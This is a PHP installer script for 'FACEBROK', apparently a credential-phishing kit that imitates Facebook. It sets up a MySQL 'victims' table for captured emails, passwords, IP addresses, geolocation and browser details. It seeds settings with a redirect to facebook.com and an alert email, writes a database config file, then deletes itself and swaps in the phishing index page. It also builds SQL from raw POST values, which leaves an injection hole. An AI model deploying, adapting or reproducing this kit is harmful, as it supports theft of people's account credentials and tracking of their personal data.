<?php
error_reporting(0);

	


class INSTALL{
	protected $_db;
	public function __construct()
    {
        $this->_db = new mysqli($_POST['server'], $_POST['user'], $_POST['pass'], $_POST['data']);
        if ( $this->_db->connect_errno )
        {
            $this->debugMessage("Failed connection to MySQL: ".$this->_db->connect_error);
            return;    
        }
        self::Query();
        self::MakeConfigFile();
    }
    public function Query(){
    	$userp=$_POST['userp'];
	 	$passp=$_POST['passp'];
		$this->_db->query("DROP TABLE IF EXISTS `users`");
    	$this->_db->query("DROP TABLE IF EXISTS `settings`");
    	$this->_db->query("DROP TABLE IF EXISTS `victims`");
    	$this->_db->query("CREATE TABLE IF NOT EXISTS `settings` (`options` varchar(50) NOT NULL, `value` varchar(100) NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1");
    	$this->_db->query("CREATE TABLE IF NOT EXISTS `users` (`username` varchar(10) NOT NULL, `password` varchar(10) NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1");
    	$this->_db->query("CREATE TABLE IF NOT EXISTS `victims` (`id` int(100) NOT NULL AUTO_INCREMENT, `email` varchar(50) NOT NULL, `password` varchar(50) NOT NULL, `date` date NOT NULL, `ip` varchar(20) NOT NULL, `country` varchar(20) NOT NULL, `city` varchar(20) NOT NULL, `os` varchar(20) NOT NULL, `browser` varchar(10) NOT NULL, `architecture` varchar(5) NOT NULL, `language` varchar(10) NOT NULL, `region` varchar(20) NOT NULL, `provetor` varchar(20) NOT NULL, `agent` varchar(100) NOT NULL, `referer` varchar(100) NOT NULL, `getdate` date NOT NULL, `logitude` varchar(20) NOT NULL, `latitude` varchar(20) NOT NULL, `device` varchar(10) NOT NULL, `continent` varchar(10) NOT NULL, `currency` varchar(10) NOT NULL, `geo` varchar(100) NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=latin1");
		$this->_db->query("INSERT INTO `settings` (`options`, `value`) VALUES ('email_alert', 'example@localhost.com'), ('url_redirect', 'https://www.facebook.com'), ('auto_translationstate', 'true'), ('Geo_location', 'false'), ('language_list', 'en;es;')");
		$this->_db->query("INSERT INTO `users` (`username`, `password`) VALUES ('$userp', '$passp')");
		$this->_db->query("ALTER TABLE `victims` ADD PRIMARY KEY (`id`)");
		$this->_db->query("ALTER TABLE `victims` MODIFY `id` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=0");
		$this->debugMessage("Install succesifully!");
	}
    public function debugMessage($message){echo "<h1><b><br>FACEBROK MESSAGE:<br><font color=white>".$message."</h1><br></b></font>";}
    public function MakeConfigFile(){
		    	$open = fopen("../configuration.php",'w');
			     fputs($open,"<?php\n");
			       fputs($open,"// FACEBROK\n");
			         fputs($open,"// Configuration DATA_BASE-----------\n");
			           fputs($open,"define('DB_HOST','".$_POST['server']."');");
			           fputs($open,"define('DB_USER','".$_POST['user']."');");
			           fputs($open,"define('DB_PASS','".$_POST['pass']."');");
			           fputs($open,"define('DB_NAME','".$_POST['data']."');\n");
			        fputs($open,"//-----------------------------------\n");
			      fputs($open,"?>\n");
			    fclose($open);
		      unlink('install.php');
		    unlink('index.php');
		rename('temp.php','index.php');
    }
}

$inst = new INSTALL;





?>
		<style type="text/css"> @import url(https://fonts.googleapis.com/css?family=Roboto:400,300,600,400italic); * {margin: 0; padding: 0; box-sizing: border-box; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; -webkit-font-smoothing: antialiased; -moz-font-smoothing: antialiased; -o-font-smoothing: antialiased; font-smoothing: antialiased; text-rendering: optimizeLegibility; } body {font-family: "Roboto", Helvetica, Arial, sans-serif; font-weight: 100; font-size: 12px; line-height: 30px; color: #777; background: #196386; } .container {max-width: 400px; width: 100%; margin: 0 auto; position: relative; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea, #contact button[type="submit"] {font: 400 12px/16px "Roboto", Helvetica, Arial, sans-serif; } #contact {background: #F9F9F9; padding: 25px; margin: 150px 0; box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24); } #contact h3 {display: block; font-size: 30px; font-weight: 300; margin-bottom: 10px; } #contact h4 {margin: 5px 0 15px; display: block; font-size: 13px; font-weight: 400; } fieldset {border: medium none !important; margin: 0 0 10px; min-width: 100%; padding: 0; width: 100%; } #contact input[type="text"], #contact input[type="email"], #contact input[type="tel"], #contact input[type="url"], #contact textarea {width: 100%; border: 1px solid #ccc; background: #FFF; margin: 0 0 5px; padding: 10px; } #contact input[type="text"]:hover, #contact input[type="email"]:hover, #contact input[type="tel"]:hover, #contact input[type="url"]:hover, #contact textarea:hover {-webkit-transition: border-color 0.3s ease-in-out; -moz-transition: border-color 0.3s ease-in-out; transition: border-color 0.3s ease-in-out; border: 1px solid #aaa; } #contact textarea {height: 100px; max-width: 100%; resize: none; } #contact button[type="submit"] {cursor: pointer; width: 100%; border: none; background: #4CAF50; color: #FFF; margin: 0 0 5px; padding: 10px; font-size: 15px; } #contact button[type="submit"]:hover {background: #43A047; -webkit-transition: background 0.3s ease-in-out; -moz-transition: background 0.3s ease-in-out; transition: background-color 0.3s ease-in-out; } #contact button[type="submit"]:active {box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5); } .copyright {text-align: center; } #contact input:focus, #contact textarea:focus {outline: 0; border: 1px solid #aaa; } ::-webkit-input-placeholder {color: #888; } :-moz-placeholder {color: #888; } ::-moz-placeholder {color: #888; } :-ms-input-placeholder {color: #888; } </style> <div class="container">

<title>FACEBROK install</title> 
<link rel="shortcut icon" href="../asses/facebook.ico" />
<p>You will be redirected in <span id="counter">10</span> second(s).</p>
<script type="text/javascript">
function countdown() {
    var i = document.getElementById('counter');
    if (parseInt(i.innerHTML)<=0) {
        location.href = '../';
    }
    i.innerHTML = parseInt(i.innerHTML)-1;
}
setInterval(function(){ countdown(); },1000);
</script>